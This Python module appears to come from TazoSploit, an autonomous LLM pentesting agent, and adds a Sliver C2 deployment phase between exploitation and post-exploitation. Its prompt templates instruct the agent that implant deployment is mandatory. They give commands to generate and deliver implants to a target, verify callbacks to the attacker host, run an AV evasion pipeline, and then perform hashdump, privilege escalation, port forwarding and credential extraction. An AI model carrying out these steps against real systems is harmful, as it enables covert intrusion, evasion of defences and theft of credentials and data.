#!/usr/bin/env python3
"""c2_phase_gate.py — C2 deployment phase gate for TazoSploit dynamic agent.

Integrates Sliver C2 deployment into the agent's phase transitions:
  EXPLOITATION → C2_DEPLOY → POST_EXPLOIT

Features:
  - C2_DEPLOY phase transition after successful exploitation
  - C2 gate: blocks POST_EXPLOIT until c2_session.json confirmed
  - Fallback to manual post-exploit after configurable retries
  - Cleanup protocol: auto-kill C2 sessions after job completion
  - Feature flag: C2_ENABLED env var (default: false for safety)

Usage:
    from c2_phase_gate import C2PhaseGate
    gate = C2PhaseGate(output_dir="/pentest/output/job1", log_func=agent._log)
    gate.check_and_transition(current_phase, vulns_found)
"""

import asyncio
import json
import logging
import os
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, Optional

log = logging.getLogger("c2_phase_gate")

# Feature flag
C2_ENABLED = os.getenv("C2_ENABLED", "false").lower() in ("true", "1", "yes")

# Config
SLIVER_CLIENT = os.getenv("SLIVER_CLIENT_BIN", "/usr/local/bin/sliver-client")
SLIVER_CONFIG = os.getenv("SLIVER_CONFIG", "/opt/sliver/configs/kali-operator.cfg")
C2_GATE_MAX_RETRIES = int(os.getenv("C2_GATE_MAX_RETRIES", "3"))
C2_GATE_TIMEOUT = int(os.getenv("C2_GATE_TIMEOUT", "120"))
C2_GATE_FALLBACK = os.getenv("C2_GATE_FALLBACK", "manual_post_exploit")  # or "skip"
SCRIPTS_DIR = os.getenv("C2_SCRIPTS_DIR", "/opt/tazosploit/scripts")

# C2 session artifact schema version
C2_SESSION_SCHEMA_VERSION = "1.0"


class C2PhaseGate:
    """Manages C2 deployment phase transitions and gate logic.

    Integrates with the dynamic agent's phase state machine to add:
      - C2_DEPLOY as an intermediate phase after EXPLOITATION
      - Gate that blocks POST_EXPLOIT until C2 session confirmed
      - Automatic fallback after max retries
      - Session cleanup on job completion
    """

    def __init__(
        self,
        output_dir: str,
        log_func: Optional[Callable] = None,
        emit_func: Optional[Callable] = None,
    ):
        self.output_dir = output_dir
        self._log_func = log_func or self._default_log
        self._emit_func = emit_func
        self.c2_enabled = C2_ENABLED
        self.c2_deploy_attempts = 0
        self.c2_deploy_max_retries = C2_GATE_MAX_RETRIES
        self.c2_session_confirmed = False
        self.c2_session_data = None
        self.c2_fallback_mode = False
        self.c2_sessions_to_cleanup = []

    def _default_log(self, msg: str, level: str = "INFO"):
        getattr(log, level.lower(), log.info)(msg)

    def _log(self, msg: str, level: str = "INFO"):
        self._log_func(f"[C2] {msg}", level)

    # ── Phase order injection ──────────────────────────────────────────────

    @staticmethod
    def inject_phase_order(phase_order: list) -> list:
        """Inject C2_DEPLOY phase into the agent's phase order.

        Transforms: [..., "EXPLOITATION", "POST_EXPLOIT", ...]
        Into:       [..., "EXPLOITATION", "C2_DEPLOY", "POST_EXPLOIT", ...]
        """
        if not C2_ENABLED:
            return phase_order

        if "C2_DEPLOY" in phase_order:
            return phase_order  # Already injected

        new_order = []
        for phase in phase_order:
            new_order.append(phase)
            if phase == "EXPLOITATION":
                new_order.append("C2_DEPLOY")
        return new_order

    @staticmethod
    def inject_phase_limits(phase_limits: dict) -> dict:
        """Add C2_DEPLOY step limit to phase limits."""
        if not C2_ENABLED:
            return phase_limits

        if "C2_DEPLOY" not in phase_limits:
            phase_limits["C2_DEPLOY"] = int(os.getenv("PHASE_C2_DEPLOY_MAX_STEPS", "5"))
        return phase_limits

    @staticmethod
    def inject_phase_outputs(phase_outputs: dict) -> dict:
        """Add C2_DEPLOY outputs to phase output mapping."""
        if not C2_ENABLED:
            return phase_outputs

        if "C2_DEPLOY" not in phase_outputs:
            phase_outputs["C2_DEPLOY"] = [
                "c2_session.json",
                "evasion_report.json",
                "payload_manifest.json",
                "evidence.json",
            ]

        # Add c2_session.json to POST_EXPLOIT inputs if not present
        if "POST_EXPLOIT" in phase_outputs:
            if "c2_session.json" not in phase_outputs["POST_EXPLOIT"]:
                phase_outputs["POST_EXPLOIT"].append("c2_session.json")

        # Add c2 outputs to FULL phase
        if "FULL" in phase_outputs:
            for artifact in ["c2_session.json", "evasion_report.json"]:
                if artifact not in phase_outputs["FULL"]:
                    phase_outputs["FULL"].append(artifact)

        return phase_outputs

    # ── Gate logic ─────────────────────────────────────────────────────────

    def should_deploy_c2(self, current_phase: str, vulns_found: dict) -> bool:
        """Check if we should transition to C2_DEPLOY phase.

        Returns True when:
          - C2 is enabled
          - We're in EXPLOITATION phase
          - At least one vuln has been exploited (has proof/access)
          - C2 session not yet confirmed
        """
        if not self.c2_enabled:
            return False

        if current_phase != "EXPLOITATION":
            return False

        if self.c2_session_confirmed:
            return False

        # Check if any vuln has been exploited with proof
        has_exploited = any(
            isinstance(v, dict) and (v.get("exploited") or v.get("proof"))
            for v in vulns_found.values()
        )

        if not has_exploited:
            return False

        # Check if access.json exists (proof of initial access)
        access_path = os.path.join(self.output_dir, "access.json")
        if not os.path.isfile(access_path):
            return False

        self._log("Exploitation successful — transitioning to C2_DEPLOY", "INFO")
        return True

    def check_c2_gate(self) -> dict:
        """Check the C2 gate status.

        Returns:
            {
                "gate_open": bool,       # True if POST_EXPLOIT can proceed
                "reason": str,           # Why gate is open/closed
                "session": dict | None,  # Session data if confirmed
                "fallback": bool,        # True if fallback mode active
            }
        """
        # Check if c2_session.json exists and is valid
        session_path = os.path.join(self.output_dir, "c2_session.json")
        if os.path.isfile(session_path):
            try:
                with open(session_path) as f:
                    data = json.load(f)
                sessions = data.get("sessions", [])
                if sessions and sessions[0].get("session_id"):
                    self.c2_session_confirmed = True
                    self.c2_session_data = data
                    self._log(
                        f"C2 gate OPEN — session {sessions[0]['session_id']} confirmed",
                        "INFO",
                    )
                    # Track for cleanup
                    for s in sessions:
                        sid = s.get("session_id")
                        if sid and sid not in self.c2_sessions_to_cleanup:
                            self.c2_sessions_to_cleanup.append(sid)

                    return {
                        "gate_open": True,
                        "reason": "c2_session.json confirmed",
                        "session": sessions[0],
                        "fallback": False,
                    }
            except (json.JSONDecodeError, KeyError) as e:
                self._log(f"Invalid c2_session.json: {e}", "WARN")

        # Check retry budget
        if self.c2_deploy_attempts >= self.c2_deploy_max_retries:
            self.c2_fallback_mode = True
            self._log(
                f"C2 gate FALLBACK — {self.c2_deploy_attempts} attempts exhausted, "
                f"proceeding with {C2_GATE_FALLBACK}",
                "WARN",
            )
            return {
                "gate_open": True,
                "reason": f"fallback after {self.c2_deploy_attempts} failed attempts",
                "session": None,
                "fallback": True,
            }

        # Gate is still closed
        remaining = self.c2_deploy_max_retries - self.c2_deploy_attempts
        self._log(
            f"C2 gate CLOSED — no confirmed session "
            f"({self.c2_deploy_attempts}/{self.c2_deploy_max_retries} attempts, "
            f"{remaining} remaining)",
            "INFO",
        )
        return {
            "gate_open": False,
            "reason": f"waiting for C2 callback ({remaining} retries left)",
            "session": None,
            "fallback": False,
        }

    def record_deploy_attempt(self, success: bool, details: str = ""):
        """Record a C2 deployment attempt."""
        self.c2_deploy_attempts += 1
        status = "SUCCESS" if success else "FAILED"
        self._log(
            f"C2 deploy attempt {self.c2_deploy_attempts}/{self.c2_deploy_max_retries}: "
            f"{status} — {details}",
            "INFO" if success else "WARN",
        )

    # ── Prompt generation ──────────────────────────────────────────────────

    def get_c2_deploy_prompt(self) -> str:
        """Generate the C2 deployment instruction prompt for the LLM agent."""
        if not self.c2_enabled:
            return ""

        attempt = self.c2_deploy_attempts + 1
        retry_note = ""
        if attempt > 1:
            retry_note = (
                f"\n**RETRY ATTEMPT {attempt}/{self.c2_deploy_max_retries}** — "
                "Previous C2 deployment failed. Try a DIFFERENT approach:\n"
                "- Different implant format (shellcode instead of exe)\n"
                "- Different delivery method (wget instead of curl)\n"
                "- Different transport (HTTPS instead of mTLS)\n"
                "- Apply evasion pipeline if AV may have caught the implant\n"
            )

        return f"""
## C2 DEPLOYMENT PHASE — MANDATORY

You MUST deploy a Sliver C2 implant before proceeding to post-exploitation.
{retry_note}
### Instructions:

1. **Generate implant** matching the target OS/arch:
   ```bash
   python3 /opt/tazosploit/scripts/generate_implant.py \\
     --os <target_os> --arch <target_arch> --transport mtls --mode session --json
   ```

2. **Get delivery commands** based on your access type:
   ```bash
   python3 /opt/tazosploit/scripts/deliver_payload.py \\
     --access-type <rce|file_upload|ssh|smb> --implant <path> \\
     --target-os <os> --kali-ip $(hostname -I | awk '{{print $1}}') --json
   ```

3. **Execute the delivery** on the target using the generated commands

4. **Verify callback**:
   ```bash
   python3 /opt/tazosploit/scripts/verify_callback.py \\
     --target <target_ip> --mode session --timeout {C2_GATE_TIMEOUT} --json
   ```

5. If callback fails, check:
   - Correct OS/arch for implant format
   - Network connectivity (target can reach Kali)
   - AV detection → use evasion pipeline:
     ```bash
     python3 /opt/tazosploit/scripts/evasion_pipeline.py \\
       --input <shellcode_path> --defense-level basic --json
     ```

**DO NOT proceed to post-exploitation until c2_session.json exists.**
**Attempts remaining: {self.c2_deploy_max_retries - self.c2_deploy_attempts}**
"""

    def get_c2_post_exploit_prompt(self) -> str:
        """Generate the C2 post-exploitation instruction prompt."""
        if not self.c2_session_data:
            return ""

        sessions = self.c2_session_data.get("sessions", [])
        if not sessions:
            return ""

        s = sessions[0]
        return f"""
## C2 POST-EXPLOITATION — Use the established Sliver session

Session ID: {s.get('session_id', 'unknown')}
Target: {s.get('target_ip', 'unknown')} ({s.get('target_os', '?')}/{s.get('target_arch', '?')})
User: {s.get('username', 'unknown')}

Run post-exploitation via the C2 session:
```bash
python3 /opt/tazosploit/scripts/c2_post_exploit.py \\
  --session-id {s.get('session_id', '<SESSION_ID>')} --action all \\
  --output-dir {self.output_dir} --json
```

Or individual actions: enum, hashdump, screenshot, processes, privesc, portfwd, download.
"""

    def get_fallback_prompt(self) -> str:
        """Generate the fallback post-exploitation prompt (no C2)."""
        return """
## POST-EXPLOITATION (Manual — C2 deployment failed)

C2 deployment was unsuccessful after multiple attempts. Proceed with manual
post-exploitation using the existing access:

1. Use the exploit access to enumerate the target manually
2. Attempt credential extraction via available tools (impacket, pypykatz)
3. Document the C2 deployment failure in findings
4. Continue with standard post-exploitation techniques
"""

    # ── Cleanup ────────────────────────────────────────────────────────────

    def cleanup_sessions(self) -> dict:
        """Kill all C2 sessions created during this job.

        Called automatically when the job completes.
        """
        if not self.c2_sessions_to_cleanup:
            return {"status": "nothing_to_clean", "sessions": []}

        results = []
        for session_id in self.c2_sessions_to_cleanup:
            result = self._kill_session(session_id)
            results.append(result)

        # Write cleanup report
        cleanup_report = {
            "cleaned_at": datetime.now(timezone.utc).isoformat(),
            "sessions": results,
            "total": len(results),
            "successful": sum(1 for r in results if r.get("status") == "killed"),
        }

        cleanup_path = os.path.join(self.output_dir, "c2_cleanup.json")
        try:
            with open(cleanup_path, "w") as f:
                json.dump(cleanup_report, f, indent=2)
        except OSError:
            pass

        self._log(
            f"C2 cleanup: {cleanup_report['successful']}/{cleanup_report['total']} sessions killed",
            "INFO",
        )
        return cleanup_report

    def _kill_session(self, session_id: str) -> dict:
        """Kill a single Sliver session."""
        result = {"session_id": session_id, "status": "unknown"}

        # Try gRPC first
        try:
            killed = asyncio.run(self._kill_session_grpc(session_id))
            if killed:
                result["status"] = "killed"
                result["method"] = "grpc"
                self._log(f"Killed session {session_id} via gRPC", "INFO")
                return result
        except Exception:
            pass

        # Fallback to CLI
        try:
            cmd = [SLIVER_CLIENT]
            if os.path.isfile(SLIVER_CONFIG):
                cmd.extend(["--config", SLIVER_CONFIG])
            cmd.extend(["sessions", "kill", session_id])

            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if proc.returncode == 0:
                result["status"] = "killed"
                result["method"] = "cli"
                self._log(f"Killed session {session_id} via CLI", "INFO")
            else:
                result["status"] = "error"
                result["error"] = proc.stderr.strip()
                self._log(f"Failed to kill session {session_id}: {proc.stderr.strip()}", "WARN")
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)
            self._log(f"Failed to kill session {session_id}: {e}", "WARN")

        return result

    async def _kill_session_grpc(self, session_id: str) -> bool:
        """Kill a session via gRPC."""
        try:
            from sliver import SliverClientConfig, SliverClient

            if not os.path.isfile(SLIVER_CONFIG):
                return False

            config = SliverClientConfig.parse_config_file(SLIVER_CONFIG)
            client = SliverClient(config)
            await client.connect()
            session = await client.interact_session(session_id)
            await session.kill()
            return True
        except Exception:
            return False

    # ── Artifact helpers ───────────────────────────────────────────────────

    def has_c2_session(self) -> bool:
        """Check if a valid c2_session.json exists."""
        session_path = os.path.join(self.output_dir, "c2_session.json")
        if not os.path.isfile(session_path):
            return False
        try:
            with open(session_path) as f:
                data = json.load(f)
            sessions = data.get("sessions", [])
            return bool(sessions and sessions[0].get("session_id"))
        except Exception:
            return False

    def get_session_id(self) -> Optional[str]:
        """Get the current C2 session ID from artifact."""
        session_path = os.path.join(self.output_dir, "c2_session.json")
        try:
            with open(session_path) as f:
                data = json.load(f)
            sessions = data.get("sessions", [])
            return sessions[0]["session_id"] if sessions else None
        except Exception:
            return None

    @staticmethod
    def create_c2_session_artifact(
        session_id: str,
        target_ip: str,
        target_os: str = "unknown",
        target_arch: str = "unknown",
        username: str = "unknown",
        hostname: str = "unknown",
        transport: str = "mtls",
        session_type: str = "session",
        implant_name: str = "",
        implant_format: str = "",
        delivery_method: str = "",
    ) -> dict:
        """Create a c2_session.json artifact dict."""
        return {
            "schema_version": C2_SESSION_SCHEMA_VERSION,
            "sessions": [
                {
                    "session_id": session_id,
                    "type": session_type,
                    "target_ip": target_ip,
                    "target_os": target_os,
                    "target_arch": target_arch,
                    "username": username,
                    "hostname": hostname,
                    "transport": transport,
                    "implant_name": implant_name,
                    "implant_format": implant_format,
                    "delivery_method": delivery_method,
                    "established_at": datetime.now(timezone.utc).isoformat(),
                }
            ],
        }
